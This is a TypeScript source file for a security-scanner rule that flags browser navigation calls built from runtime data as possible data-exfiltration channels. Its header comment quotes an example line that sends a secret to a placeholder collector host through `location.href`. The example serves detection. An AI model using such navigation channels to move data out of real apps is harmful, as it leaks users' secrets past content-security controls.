/**
 * PANE-EXFIL-004 — navigation sinks with a non-literal argument.
 *
 * `location.href = 'https://collector.example/?d=' + secret` is a complete
 * exfiltration channel: the URL carries the data, and no `_meta.ui.csp` field
 * governs navigation.
 *
 * ── Why `window.open` is reported LOWER, and the rule says so ───────────────
 * The reference host's sandbox is exactly `allow-scripts allow-same-origin
 * allow-forms` (`examples/basic-host/src/sandbox.ts`). It does NOT grant
 * `allow-popups` or `allow-top-navigation`, so `window.open` is blocked there,
 * while self-navigation and `<meta http-equiv="refresh">` are gated by no
 * sandbox flag at all and remain live.
 *
 * That distinction is the difference between a finding an operator can act on
 * and a finding that gets the tool switched off. It is also the honest
 * formulation: any given production host's sandbox value is unverifiable from
 * a server (non-goal N2), so `window.open` is demoted rather than dropped.
 *
 * The literal carve-out applies here too: a literal destination cannot carry
 * runtime data out.
 */

import type { Node } from 'acorn';
import { simple as walkSimple } from 'acorn-walk';
import type { Finding, RuleContext, RuleResult, Severity, SourceLocation } from '../../types.js';
import type { ParsedScript } from '../../parse/js.js';
import { findCalls, findMemberAssignments, isLiteralExpression } from '../../parse/js.js';
import { defineRule, makeFinding, structuralPath } from '../shared/helpers.js';
import { rebase, scriptsOf, sourceOf } from './url-shape.js';

const REMEDIATION =
  'Do not build a navigation target from runtime data. No `_meta.ui.csp` field governs navigation, ' +
  'so the host cannot block it. Send data with `fetch()` to an origin declared in `connectDomains`, ' +
  'or hand a user-visible URL to the host with `ui/open-link` (which is at least visible to the user).';

/**
 * The sandbox note that keeps the `window.open` demotion honest rather than
 * arbitrary. Attached as the finding's assumption, since it is conditional on a
 * host sandbox value the specification never enumerates.
 */
const POPUP_SANDBOX_NOTE =
  'The reference host grants `allow-scripts allow-same-origin allow-forms` and therefore neither ' +
  '`allow-popups` nor `allow-top-navigation`, so `window.open` is blocked there. Self-navigation ' +
  'is gated by no sandbox flag. Any given production host\'s sandbox value is unverifiable from a ' +
  'server (non-goal N2).';

interface Sink {
  script: ParsedScript;
  node: Node;
  /** The sink as an author would name it, e.g. `location.href`. */
  name: string;
  arg: Node;
  location: SourceLocation | undefined;
  /** True for `window.open`, which the reference sandbox blocks. */
  popup: boolean;
}

/** Is this expression `location` or something ending `.location`? */
function isLocationObject(node: Node | undefined): boolean {
  if (!node) return false;
  const n = node as unknown as { type: string; name?: string; property?: Node; computed?: boolean };
  if (n.type === 'Identifier') return n.name === 'location';
  if (n.type === 'MemberExpression' && !n.computed) {
    const prop = n.property as unknown as { name?: string };
    return prop.name === 'location';
  }
  return false;
}

/**
 * Receivers whose `.location` is a navigation sink.
 *
 * `.location` is not an HTML-only property name, and this rule is HIGH/HIGH —
 * gate-eligible. `marker.location = data.position` is ordinary code in a map
 * app, and `map-server` is a reference server: a finding there fails the corpus
 * outright. Only a browsing context navigates.
 */
const NAVIGABLE = new Set(['window', 'top', 'parent', 'self', 'globalThis', 'document', 'frames']);

function isNavigableObject(node: Node | undefined): boolean {
  if (!node) return false;
  const n = node as unknown as { type: string; name?: string; object?: Node; property?: Node; computed?: boolean };
  if (n.type === 'Identifier') return NAVIGABLE.has(n.name ?? '');
  if (n.type === 'MemberExpression') {
    // `window.frames[0].location`, `window.top.location`
    if (!n.computed) {
      const prop = n.property as unknown as { name?: string };
      if (NAVIGABLE.has(prop.name ?? '')) return true;
    }
    return isNavigableObject(n.object);
  }
  return false;
}

/**
 * Does this script declare its own `location` binding?
 *
 * A shadowed `location` is a local variable, not the browsing context. Scope
 * blind on purpose: the cost of missing one real sink in a script that also
 * shadows the name is lower than a gate-eligible finding on a local.
 */
function shadowsLocation(script: ParsedScript): boolean {
  if (!script.ast) return false;
  let shadowed = false;
  const named = (node: Node | undefined): boolean =>
    (node as unknown as { type?: string; name?: string })?.type === 'Identifier' &&
    (node as unknown as { name?: string }).name === 'location';

  walkSimple(script.ast, {
    VariableDeclarator(node: Node) {
      if (named((node as unknown as { id: Node }).id)) shadowed = true;
    },
    FunctionDeclaration(node: Node) {
      if (((node as unknown as { params?: Node[] }).params ?? []).some(named)) shadowed = true;
    },
    FunctionExpression(node: Node) {
      if (((node as unknown as { params?: Node[] }).params ?? []).some(named)) shadowed = true;
    },
    ArrowFunctionExpression(node: Node) {
      if (((node as unknown as { params?: Node[] }).params ?? []).some(named)) shadowed = true;
    },
  });
  return shadowed;
}

function collect(scripts: ParsedScript[]): Sink[] {
  const out: Sink[] = [];

  // `location.href = …` / `window.location.href = …`, and `window.location = …`
  for (const a of findMemberAssignments(scripts, ['href', 'location'])) {
    const left = (a.node as unknown as { left: Node }).left as unknown as { object?: Node };
    if (a.property === 'href') {
      if (!isLocationObject(left.object)) continue; // `anchor.href` is PANE-EXFIL-005
      out.push({ script: a.script, node: a.node, name: 'location.href', arg: a.right, location: a.location, popup: false });
    } else {
      // `.location = …` on a browsing context, never on an arbitrary object.
      if (!isNavigableObject(left.object)) continue;
      out.push({ script: a.script, node: a.node, name: 'window.location', arg: a.right, location: a.location, popup: false });
    }
  }

  // Bare `location = …`. findMemberAssignments only sees MemberExpressions.
  for (const script of scripts) {
    if (!script.ast) continue;
    if (shadowsLocation(script)) continue;
    walkSimple(script.ast, {
      AssignmentExpression(node: Node) {
        const a = node as unknown as { left: Node; right: Node };
        const l = a.left as unknown as { type: string; name?: string };
        if (l.type !== 'Identifier' || l.name !== 'location') return;
        out.push({
          script,
          node,
          name: 'location',
          arg: a.right,
          location: rebase(script, node),
          popup: false,
        });
      },
    });
  }

  for (const call of findCalls(scripts, [
    { object: 'location', method: 'assign' },
    { object: 'location', method: 'replace' },
    { object: 'window', method: 'open' },
  ])) {
    const arg = call.args[0];
    if (!arg) continue;
    const popup = call.matched.method === 'open';
    out.push({
      script: call.script,
      node: call.node,
      name: popup ? 'window.open' : `location.${call.matched.method}`,
      arg,
      location: call.location,
      popup,
    });
  }

  return out;
}

export const exfil004 = defineRule({
  id: 'PANE-EXFIL-004',
  ruleClass: 'RISK',
  severity: 'HIGH',
  confidence: 'HIGH',
  title: 'Navigation target built at runtime',
  specRef: 'SEP-1865 apps.mdx L275-284, L1733-1744 — no navigation directive in either policy',
  cwe: 'CWE-601',
  remediation: REMEDIATION,
  experimental: false,
  status: 'active',
  since: '0.1.0',
  requires: ['content'],

  check(ctx: RuleContext): RuleResult {
    const findings: Finding[] = [];
    let n = 0;

    for (const sink of collect(scriptsOf(ctx))) {
      if (isLiteralExpression(sink.arg)) continue;

      const severity: Severity = sink.popup ? 'MEDIUM' : 'HIGH';
      const base = script0(sink.script);

      findings.push(
        makeFinding({
          ctx,
          rule: exfil004,
          message: sink.popup
            ? '`window.open` is called with a non-literal URL. Reported BELOW self-navigation: the ' +
              'reference host\'s sandbox is `allow-scripts allow-same-origin allow-forms`, which ' +
              'grants neither `allow-popups` nor `allow-top-navigation`, so this call is blocked ' +
              'there. Self-navigation and meta refresh are gated by no sandbox flag.'
            : `\`${sink.name}\` is assigned a non-literal URL. The URL carries whatever the app puts ` +
              'in it, no `_meta.ui.csp` field governs navigation, and no sandbox flag gates a ' +
              'document navigating itself.',
          evidence: sourceOf(sink.script, sink.node),
          ...(sink.location ? { location: sink.location } : {}),
          severity,
          ...(sink.popup ? { assumption: POPUP_SANDBOX_NOTE } : {}),
          path: `${base}::${sink.name}#${n++}`,
        }),
      );
    }

    return { findings };
  },
});

function script0(script: ParsedScript): string {
  return script.element ? structuralPath(script.element) : 'script';
}

export default exfil004;
